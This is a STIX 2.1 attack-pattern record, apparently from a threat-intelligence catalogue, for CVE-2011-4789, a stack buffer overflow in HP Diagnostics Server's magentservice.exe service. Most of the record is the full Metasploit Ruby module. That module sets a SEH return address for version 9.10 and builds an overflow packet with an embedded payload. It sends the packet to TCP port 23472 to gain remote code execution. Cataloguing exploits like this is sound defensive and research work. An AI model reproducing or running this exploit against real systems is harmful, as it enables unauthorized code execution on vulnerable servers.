{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e8c81d9-ab94-47aa-a012-229fc6e72e35",
    "created": "2024-08-14T16:47:04.606819Z",
    "modified": "2024-08-14T16:47:04.606823Z",
    "name": "HP Diagnostics Server magentservice.exe Overflow",
    "description": " This module exploits a stack buffer overflow in HP Diagnostics Server magentservice.exe service. By sending a specially crafted packet, an attacker may be able to execute arbitrary code. Originally found and posted by AbdulAziz Harir via ZDI. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_magentservice.rb",
            "external_id": "hp_magentservice.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4789"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Diagnostics Server magentservice.exe Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP Diagnostics Server\n        magentservice.exe service. By sending a specially crafted packet, an attacker\n        may be able to execute arbitrary code. Originally found and posted by\n        AbdulAziz Harir via ZDI.\n      },\n      'Author'         =>\n        [\n          'AbdulAziz Hariri', # Original discovery\n          'hal',              # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '72815'],\n          ['CVE', '2011-4789'],\n          ['ZDI', '12-016']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'SSL' => true,\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          [\n            'Diagnostics Server 9.10',\n            {\n              # pop esi # pop ebx # ret 10\n              # magentservice.exe\n              'Ret' => 0x780c8f1f\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-01-12'))\n\n      register_options([Opt::RPORT(23472)])\n  end\n\n  def exploit\n\n    req =  \"\\x00\\x00\\x00\\x00\"\n    req << rand_text_alpha_upper(1092)\n    req << generate_seh_payload(target.ret)\n\n    connect\n    sock.put(req)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-12",
    "x_mitre_platforms": [
        "win'"
    ]
}